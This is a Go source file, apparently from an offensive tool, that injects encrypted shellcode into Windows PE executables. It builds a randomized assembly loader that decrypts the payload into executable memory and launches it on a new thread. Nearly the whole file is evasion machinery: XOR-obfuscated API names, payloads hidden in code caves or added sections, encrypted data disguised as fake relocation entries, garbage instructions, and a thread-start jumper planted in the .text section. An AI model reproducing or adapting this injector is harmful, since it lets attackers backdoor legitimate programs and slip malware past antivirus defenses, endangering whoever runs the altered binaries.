package injector

import (
	"bytes"
	"embed"
	"encoding/binary"
	"encoding/hex"
	"errors"
	"fmt"
	"slices"
	"strconv"
	"strings"
	"text/template"
)

// just for prevent [import _ "embed"] :)
var _ embed.FS

// mov eax, 0x11223344     mov rax, 0x1122334455667788
// xor eax, ebx            xor rax, rbx
// mov [edi], eax          mov [rdi], rax
// add edi, 4              add rdi, 8
const numInstForCopyPayload = 4

const (
	maxNumLoaderInstX86 = 350
	maxNumLoaderInstX64 = 300
)

const (
	codeCaveModeStub   = "{{STUB CodeCaveMode STUB}}"
	reservedLoaderSize = 4096
)

// The role of the payload loader is used to decrypt payload
// in the tail section to a new RWX page, then create thread at
// the decrypted payload(default loader template).
var (
	//go:embed loader/loader_x86.asm
	defaultLoaderX86 string

	//go:embed loader/loader_x64.asm
	defaultLoaderX64 string
)

var (
	registerX86 = []string{
		"eax", "ebx", "ecx", "edx",
		"ebp", "edi", "esi",
	}

	regVolatileX86 = []string{
		"eax", "ecx", "edx",
	}

	regNonvolatileX86 = []string{
		"ebx", "ebp", "edi", "esi",
	}

	registerX64 = []string{
		"rax", "rbx", "rcx", "rdx",
		"rbp", "rdi", "rsi",
		"r8", "r9", "r10", "r11",
		"r12", "r13", "r14", "r15",
	}

	regVolatileX64 = []string{
		"rax", "rcx", "rdx",
		"r8", "r9", "r10", "r11",
	}

	regNonvolatileX64 = []string{
		"rbx", "rbp", "rdi", "rsi",
		"r12", "r13", "r14", "r15",
	}
)

type loaderCtx struct {
	// for replace registers
	Reg  map[string]string
	RegV map[string]string
	RegN map[string]string

	// custom arguments from options
	Args map[string]interface{}

	// store procedure status
	LackProcedure           bool
	LackVirtualAlloc        bool
	LackVirtualFree         bool
	LackVirtualProtect      bool
	LackCreateThread        bool
	LackWaitForSingleObject bool
	LoadLibraryWOnly        bool

	// store options status
	NeedCreateThread    bool
	NeedWaitThread      bool
	NeedEraseShellcode  bool
	NeedShellcodeJumper bool

	// encrypt procedure name with xor
	Kernel32DLLDB          []int64
	Kernel32DLLKey         []int64
	VirtualAllocDB         []int64
	VirtualAllocKey        []int64
	VirtualFreeDB          []int64
	VirtualFreeKey         []int64
	VirtualProtectDB       []int64
	VirtualProtectKey      []int64
	CreateThreadDB         []int64
	CreateThreadKey        []int64
	WaitForSingleObjectDB  []int64
	WaitForSingleObjectKey []int64

	// store procedure IAT offset
	LoadLibrary         uint64
	GetProcAddress      uint64
	VirtualAlloc        uint64
	VirtualFree         uint64
	VirtualProtect      uint64
	CreateThread        uint64
	WaitForSingleObject uint64

	// information of write payload
	CodeCave      bool
	ExtendSection bool
	CreateSection bool
	JumperOffset  uint32
	EntryOffset   int
	MemRegionSize int
	PayloadOffset uint32
	PayloadSize   int
	PayloadKey    interface{}

	// mark the end of loader
	EndOfLoader []byte
}

func (inj *Injector) buildLoader(payload []byte) (output []byte, err error) {
	defer func() {
		if r := recover(); r != nil {
			err = errors.New(fmt.Sprint(r))
		}
	}()
	var src string
	switch inj.arch {
	case "386":
		src = inj.getLoaderX86()
	case "amd64":
		src = inj.getLoaderX64()
	}
	asm, err := inj.buildLoaderASM(src, payload, false)
	if err != nil {
		return nil, err
	}
	return inj.assemble(asm)
}

func (inj *Injector) buildLoaderASM(src string, payload []byte, ins bool) (string, error) {
	// make sure payload is 4 or 8 bytes alignment
	var numPad int
	switch inj.arch {
	case "386":
		numPad = len(payload) % 4
		if numPad != 0 {
			numPad = 4 - numPad
		}
	case "amd64":
		numPad = len(payload) % 8
		if numPad != 0 {
			numPad = 8 - numPad
		}
	}
	payload = bytes.Clone(payload)
	payload = append(payload, bytes.Repeat([]byte{0x00}, numPad)...)
	// prepare loader context for build source
	entryOffset := 16 + inj.rand.Intn(512)
	memRegionSize := ((entryOffset+len(payload))/4096 + 1 + inj.rand.Intn(16)) * 4096
	ctx := &loaderCtx{
		Reg:  inj.buildRandomRegisterMap(),
		RegV: inj.buildVolatileRegisterMap(),
		RegN: inj.buildNonvolatileRegisterMap(),
		Args: inj.opts.Arguments,

		EntryOffset:   entryOffset,
		MemRegionSize: memRegionSize,
		PayloadSize:   len(payload),

		CodeCave:      inj.opts.ForceCodeCave,
		ExtendSection: inj.opts.ForceExtendSection,
		CreateSection: inj.opts.ForceCreateSection,

		EndOfLoader: endOfShellcode,
	}
	err := inj.findProcFromIAT(ctx)
	if err != nil {
		return "", err
	}
	err = inj.writeShellcodeJumper(ctx)
	if err != nil {
		return "", err
	}
	inj.encryptStrings(ctx)
	// update context
	hasLoadLibraryA := inj.getProcFromIAT("LoadLibraryA") != nil
	hasLoadLibraryW := inj.getProcFromIAT("LoadLibraryW") != nil
	hasGetProcAddress := inj.getProcFromIAT("GetProcAddress") != nil
	inj.ctx.WaitThread = ctx.NeedWaitThread
	inj.ctx.EraseShellcode = ctx.NeedEraseShellcode
	inj.ctx.ShellcodeJumper = ctx.NeedShellcodeJumper
	inj.ctx.HasAllProcedures = !ctx.LackProcedure
	inj.ctx.HasVirtualAlloc = !ctx.LackVirtualAlloc
	inj.ctx.HasVirtualFree = !ctx.LackVirtualFree
	inj.ctx.HasVirtualProtect = !ctx.LackVirtualProtect
	inj.ctx.HasCreateThread = !ctx.LackCreateThread
	inj.ctx.HasWaitForSingleObject = !ctx.LackWaitForSingleObject
	inj.ctx.HasLoadLibraryA = hasLoadLibraryA
	inj.ctx.HasLoadLibraryW = hasLoadLibraryW
	inj.ctx.HasGetProcAddress = hasGetProcAddress
	if ins {
		switch inj.arch {
		case "386":
			ctx.PayloadKey = inj.rand.Uint32()
		case "amd64":
			ctx.PayloadKey = inj.rand.Uint64()
		}
	} else {
		src, err = inj.buildLoaderSource(ctx, payload, src)
		if err != nil {
			return "", err
		}
	}
	// process loader template and assemble it
	tpl, err := template.New("loader").Funcs(template.FuncMap{
		"db":  toDB,
		"hex": toHex,
		"dr":  toRegDWORD,
		"igi": inj.insertGarbageInst,
	}).Parse(src)
	if err != nil {
		return "", fmt.Errorf("invalid loader template: %s", err)
	}
	buf := bytes.NewBuffer(make([]byte, 0, 512))
	err = tpl.Execute(buf, ctx)
	if err != nil {
		return "", fmt.Errorf("failed to build loader source: %s", err)
	}
	return buf.String(), nil
}

func (inj *Injector) getLoaderX86() string {
	if inj.opts.LoaderX86 != "" {
		return inj.opts.LoaderX86
	}
	return defaultLoaderX86
}

func (inj *Injector) getLoaderX64() string {
	if inj.opts.LoaderX64 != "" {
		return inj.opts.LoaderX64
	}
	return defaultLoaderX64
}

func (inj *Injector) buildRandomRegisterMap() map[string]string {
	var reg []string
	switch inj.arch {
	case "386":
		reg = slices.Clone(registerX86)
	case "amd64":
		reg = slices.Clone(registerX64)
	}
	inj.regBox = reg
	register := make(map[string]string, len(reg))
	switch inj.arch {
	case "386":
		for _, reg := range registerX86 {
			register[reg] = inj.selectRegister()
		}
	case "amd64":
		for _, reg := range registerX64 {
			register[reg] = inj.selectRegister()
		}
	}
	return register
}

func (inj *Injector) buildVolatileRegisterMap() map[string]string {
	var reg []string
	switch inj.arch {
	case "386":
		reg = slices.Clone(regVolatileX86)
	case "amd64":
		reg = slices.Clone(regVolatileX64)
	}
	inj.regBox = reg
	register := make(map[string]string, len(reg))
	switch inj.arch {
	case "386":
		for _, reg := range regVolatileX86 {
			register[reg] = inj.selectRegister()
		}
	case "amd64":
		for _, reg := range regVolatileX64 {
			register[reg] = inj.selectRegister()
		}
	}
	return register
}

func (inj *Injector) buildNonvolatileRegisterMap() map[string]string {
	var reg []string
	switch inj.arch {
	case "386":
		reg = slices.Clone(regNonvolatileX86)
	case "amd64":
		reg = slices.Clone(regNonvolatileX64)
	}
	inj.regBox = reg
	register := make(map[string]string, len(reg))
	switch inj.arch {
	case "386":
		for _, reg := range regNonvolatileX86 {
			register[reg] = inj.selectRegister()
		}
	case "amd64":
		for _, reg := range regNonvolatileX64 {
			register[reg] = inj.selectRegister()
		}
	}
	return register
}

// selectRegister is used to make sure each register will be selected once.
func (inj *Injector) selectRegister() string {
	idx := inj.rand.Intn(len(inj.regBox))
	reg := inj.regBox[idx]
	// remove selected register
	inj.regBox = append(inj.regBox[:idx], inj.regBox[idx+1:]...)
	return reg
}

func (inj *Injector) findProcFromIAT(ctx *loaderCtx) error {
	VirtualAlloc := inj.getProcFromIAT("VirtualAlloc")
	VirtualFree := inj.getProcFromIAT("VirtualFree")
	VirtualProtect := inj.getProcFromIAT("VirtualProtect")
	CreateThread := inj.getProcFromIAT("CreateThread")
	WaitForSingleObject := inj.getProcFromIAT("WaitForSingleObject")
	var lackProcedure bool
	if VirtualAlloc != nil {
		ctx.VirtualAlloc = VirtualAlloc.addr
	} else {
		ctx.LackVirtualAlloc = true
		lackProcedure = true
	}
	if !inj.opts.NotEraseShellcode {
		if !(!inj.opts.NotCreateThread && inj.opts.NotWaitThread) {
			if VirtualFree != nil {
				ctx.VirtualFree = VirtualFree.addr
			} else {
				ctx.LackVirtualFree = true
				lackProcedure = true
			}
			ctx.NeedEraseShellcode = true
		}
	}
	if VirtualProtect != nil {
		ctx.VirtualProtect = VirtualProtect.addr
	} else {
		ctx.LackVirtualProtect = true
		lackProcedure = true
	}
	if !inj.opts.NotCreateThread {
		if CreateThread != nil {
			ctx.CreateThread = CreateThread.addr
		} else {
			ctx.LackCreateThread = true
			lackProcedure = true
		}
		ctx.NeedCreateThread = true
		if !inj.opts.NotWaitThread {
			if WaitForSingleObject != nil {
				ctx.WaitForSingleObject = WaitForSingleObject.addr
			} else {
				ctx.LackWaitForSingleObject = true
				lackProcedure = true
			}
			ctx.NeedWaitThread = true
		}
	}
	ctx.LackProcedure = lackProcedure
	if !lackProcedure {
		return nil
	}
	return inj.findProcForLack(ctx)
}

func (inj *Injector) findProcForLack(ctx *loaderCtx) error {
	LoadLibraryA := inj.getProcFromIAT("LoadLibraryA")
	LoadLibraryW := inj.getProcFromIAT("LoadLibraryW")
	GetProcAddress := inj.getProcFromIAT("GetProcAddress")
	if LoadLibraryA == nil && LoadLibraryW == nil {
		return errors.New("proc LoadLibrary is not exist in IAT")
	}
	if GetProcAddress == nil {
		return errors.New("proc GetProcAddress is not exist in IAT")
	}
	if LoadLibraryA != nil {
		ctx.LoadLibrary = LoadLibraryA.addr
	} else {
		ctx.LoadLibrary = LoadLibraryW.addr
		ctx.LoadLibraryWOnly = true
	}
	ctx.GetProcAddress = GetProcAddress.addr
	return nil
}

func (inj *Injector) getProcFromIAT(proc string) *iat {
	for _, iat := range inj.iat {
		if iat.proc == proc {
			return iat
		}
	}
	return nil
}

func (inj *Injector) encryptStrings(ctx *loaderCtx) {
	isUTF16 := ctx.LoadLibraryWOnly
	ctx.Kernel32DLLDB, ctx.Kernel32DLLKey = inj.encryptString("kernel32.dll", isUTF16)
	ctx.VirtualAllocDB, ctx.VirtualAllocKey = inj.encryptString("VirtualAlloc", false)
	ctx.VirtualFreeDB, ctx.VirtualFreeKey = inj.encryptString("VirtualFree", false)
	ctx.VirtualProtectDB, ctx.VirtualProtectKey = inj.encryptString("VirtualProtect", false)
	ctx.CreateThreadDB, ctx.CreateThreadKey = inj.encryptString("CreateThread", false)
	ctx.WaitForSingleObjectDB, ctx.WaitForSingleObjectKey = inj.encryptString("WaitForSingleObject", false)
}

func (inj *Injector) encryptString(str string, isUTF16 bool) ([]int64, []int64) {
	str += "\x00"
	if isUTF16 {
		str = toUTF16(str)
	}
	var (
		val []int64
		key []int64
	)
	switch inj.arch {
	case "386":
		// process alignment
		num := len(str) % 4
		if num != 0 {
			num = 4 - num
		}
		str += strings.Repeat("\x00", num)
		for i := len(str) - 4; i >= 0; i -= 4 {
			v := binary.LittleEndian.Uint32([]byte(str[i:]))
			k := inj.rand.Uint32()
			val = append(val, int64(v^k))
			key = append(key, int64(k))
		}
	case "amd64":
		// process alignment
		num := len(str) % 8
		if num != 0 {
			num = 8 - num
		}
		str += strings.Repeat("\x00", num)
		for i := len(str) - 8; i >= 0; i -= 8 {
			v := int64(binary.LittleEndian.Uint64([]byte(str[i:]))) // #nosec G115
			k := inj.rand.Int63()
			val = append(val, v^k)
			key = append(key, k)
		}
	}
	return val, key
}

// writeShellcodeJumper is used to try to find a code cave for store instructions
// about a jumper to the shellcode, that the thread start address is in .text section.
func (inj *Injector) writeShellcodeJumper(ctx *loaderCtx) error {
	if inj.opts.NoShellcodeJumper || inj.opts.NotCreateThread || len(inj.caves) == 0 {
		return nil
	}
	var src string
	switch inj.arch {
	case "386":
		src = `
            .code32
            // read thread argument that stored the shellcode address
            mov {{.Reg.eax}}, [esp+4]
            call {{.Reg.eax}}
            ret                      `
	case "amd64":
		src = `
            .code64
            // read thread argument that stored the shellcode address
            mov {{.Reg.rax}}, rcx
            sub rsp, 0x28
            call {{.Reg.rax}}
            add rsp, 0x28
            ret                  `
	}
	type jumperCtx struct {
		Reg map[string]string
	}
	jmpCtx := &jumperCtx{
		Reg: inj.buildRandomRegisterMap(),
	}
	// process loader template and assemble it
	tpl, err := template.New("jumper").Parse(src)
	if err != nil {
		return fmt.Errorf("invalid shellcode jumper template: %s", err)
	}
	buf := bytes.NewBuffer(make([]byte, 0, 512))
	err = tpl.Execute(buf, jmpCtx)
	if err != nil {
		return fmt.Errorf("failed to build shellcode jumper source: %s", err)
	}
	inst, err := inj.assemble(buf.String())
	if err != nil {
		return fmt.Errorf("failed to assemble shellcode jumper: %s", err)
	}
	cave := inj.selectCodeCave()
	cave.Write(inj.dup, inst)
	// update loader context
	ctx.NeedShellcodeJumper = true
	ctx.JumperOffset = cave.virtualAddr
	return nil
}

func (inj *Injector) buildLoaderSource(ctx *loaderCtx, sc []byte, src string) (string, error) {
	var counter int
	for _, sw := range []bool{
		inj.opts.ForceCodeCave,
		inj.opts.ForceExtendSection,
		inj.opts.ForceCreateSection,
	} {
		if sw {
			counter++
		}
	}
	if counter > 1 {
		return "", errors.New("invalid force mode with payload source")
	}
	var maxLoaderSize int
	switch inj.arch {
	case "386":
		maxLoaderSize = maxNumLoaderInstX86
	case "amd64":
		maxLoaderSize = maxNumLoaderInstX64
	}
	if maxLoaderSize > len(inj.caves) || inj.opts.ForceCreateSection {
		if inj.opts.ForceCodeCave {
			return "", errors.New("not enough code caves for force code cave mode")
		}
		if inj.opts.ForceExtendSection {
			return "", errors.New("not enough code caves for force extend section mode")
		}
		return inj.useCreateSectionMode(ctx, sc, src)
	}
	if inj.opts.ForceExtendSection {
		return inj.useExtendSectionMode(ctx, sc, src), nil
	}
	// check can use code cave mode
	var numCaves int
	switch inj.arch {
	case "386":
		numCaves = (len(sc)/4 + 1) * numInstForCopyPayload
		numCaves += maxNumLoaderInstX86
	case "amd64":
		numCaves = (len(sc)/8 + 1) * numInstForCopyPayload
		numCaves += maxNumLoaderInstX64
	}
	if numCaves < len(inj.caves) {
		return inj.useCodeCaveMode(ctx, sc, src), nil
	}
	// if the number of code caves is not enough
	if inj.opts.ForceCodeCave {
		return "", errors.New("not enough code caves for force code cave mode")
	}
	return inj.useExtendSectionMode(ctx, sc, src), nil
}

func (inj *Injector) useCodeCaveMode(ctx *loaderCtx, sc []byte, src string) string {
	// generate assembly source
	var stub string
	switch inj.arch {
	case "386":
		key := inj.rand.Uint32()
		ctx.PayloadKey = key
		for i := 0; i < len(sc); i += 4 {
			reg := regVolatileX86[inj.rand.Intn(len(regVolatileX86))]
			val := binary.LittleEndian.Uint32(sc[i:])
			stub += fmt.Sprintf(`
              mov {{.RegV.%[1]s}}, 0x%[2]X
              xor {{.RegV.%[1]s}}, {{.RegN.ebx}}
              mov [{{.RegN.edi}}], {{.RegV.%[1]s}}
              add {{.RegN.edi}}, 4`, reg, val^key)
			stub += "\r\n"
		}
	case "amd64":
		key := inj.rand.Uint64()
		ctx.PayloadKey = key
		for i := 0; i < len(sc); i += 8 {
			reg := regVolatileX64[inj.rand.Intn(len(regVolatileX64))]
			val := binary.LittleEndian.Uint64(sc[i:])
			stub += fmt.Sprintf(`
              mov {{.RegV.%[1]s}}, 0x%[2]X
              xor {{.RegV.%[1]s}}, {{.RegN.rbx}}
              mov [{{.RegN.rdi}}], {{.RegV.%[1]s}}
              add {{.RegN.rdi}}, 8`, reg, val^key)
			stub += "\r\n"
		}
	}
	ctx.CodeCave = true
	inj.ctx.Mode = ModeCodeCave
	// replace the flag to assembly source
	return strings.ReplaceAll(src, codeCaveModeStub, stub)
}

func (inj *Injector) useExtendSectionMode(ctx *loaderCtx, sc []byte, src string) string {
	payload := inj.encryptPayload(ctx, sc)
	offset := inj.extendSection(payload)
	ctx.ExtendSection = true
	ctx.PayloadOffset = offset
	inj.ctx.Mode = ModeExtendSection
	// remove the flag in assembly source
	return strings.ReplaceAll(src, codeCaveModeStub, "")
}

func (inj *Injector) useCreateSectionMode(ctx *loaderCtx, sc []byte, src string) (string, error) {
	payload := inj.encryptPayload(ctx, sc)
	randomOffset := uint32(inj.rand.Intn(2048)) // #nosec G115
	scOffset := reservedLoaderSize + randomOffset
	size := scOffset + uint32(len(payload)) // #nosec G115
	section, err := inj.createSection(inj.opts.SectionName, size)
	if err != nil {
		return "", err
	}
	inj.section = section
	// write random data for padding caves between loader and payload
	_, _ = inj.rand.Read(inj.dup[inj.section.Offset : inj.section.Offset+scOffset])
	// write encrypted payload
	copy(inj.dup[section.Offset+scOffset:], payload)
	ctx.CreateSection = true
	ctx.PayloadOffset = section.VirtualAddress + scOffset
	inj.ctx.Mode = ModeCreateSection
	// remove the flag in assembly source
	return strings.ReplaceAll(src, codeCaveModeStub, ""), nil
}

func (inj *Injector) encryptPayload(ctx *loaderCtx, sc []byte) []byte {
	// encrypt payload
	encrypted := make([]byte, len(sc))
	switch inj.arch {
	case "386":
		key := inj.rand.Uint32()
		ctx.PayloadKey = key
		for i := 0; i < len(sc); i += 4 {
			val := binary.LittleEndian.Uint32(sc[i:])
			binary.LittleEndian.PutUint32(encrypted[i:], val^key)
			key = xorShift32(key)
		}
	case "amd64":
		key := inj.rand.Uint64()
		ctx.PayloadKey = key
		for i := 0; i < len(sc); i += 8 {
			val := binary.LittleEndian.Uint64(sc[i:])
			binary.LittleEndian.PutUint64(encrypted[i:], val^key)
			key = xorShift64(key)
		}
	}
	// build a fake relocate section data
	section := bytes.NewBuffer(make([]byte, 0, len(encrypted)*2))
	begin := uint8(160 + inj.rand.Intn(32)) // #nosec G115
	var counter int
	for i := 0; i < len(encrypted); i++ {
		section.WriteByte(encrypted[i])
		section.WriteByte(begin)
		counter++
		vv := inj.rand.Intn(10)
		switch {
		case vv == 0:
			if counter >= 8 {
				begin++
				counter = 0
			}
		case vv >= 4:
			if counter >= 7 {
				begin++
				counter = 0
			}
		default:
			if counter >= 9 {
				begin++
				counter = 0
			}
		}
	}
	return section.Bytes()
}

func (inj *Injector) insertGarbageInst() string {
	if inj.opts.NoGarbage || inj.ctx.Mode != ModeCreateSection {
		return ""
	}
	return ";" + toDB(inj.garbageInst())
}

func xorShift32(seed uint32) uint32 {
	seed ^= seed << 13
	seed ^= seed >> 17
	seed ^= seed << 5
	return seed
}

func xorShift64(seed uint64) uint64 {
	seed ^= seed << 13
	seed ^= seed >> 7
	seed ^= seed << 17
	return seed
}

func toUTF16(s string) string {
	u := strings.Builder{}
	u.Grow(len(s) * 2)
	for _, r := range s {
		u.WriteRune(r)
		u.WriteByte(0x00)
	}
	return u.String()
}

func toDB(b []byte) string {
	if len(b) == 0 {
		return ""
	}
	builder := strings.Builder{}
	builder.WriteString(".byte ")
	for i := 0; i < len(b); i++ {
		builder.WriteString("0x")
		s := hex.EncodeToString([]byte{b[i]})
		builder.WriteString(strings.ToUpper(s))
		builder.WriteString(", ")
	}
	return builder.String()
}

func toHex(v any) string {
	return fmt.Sprintf("0x%X", v)
}

// convert r8 -> r8d, rax -> eax
func toRegDWORD(reg string) string {
	_, err := strconv.Atoi(reg[1:])
	if err == nil {
		return reg + "d"
	}
	return strings.ReplaceAll(reg, "r", "e")
}
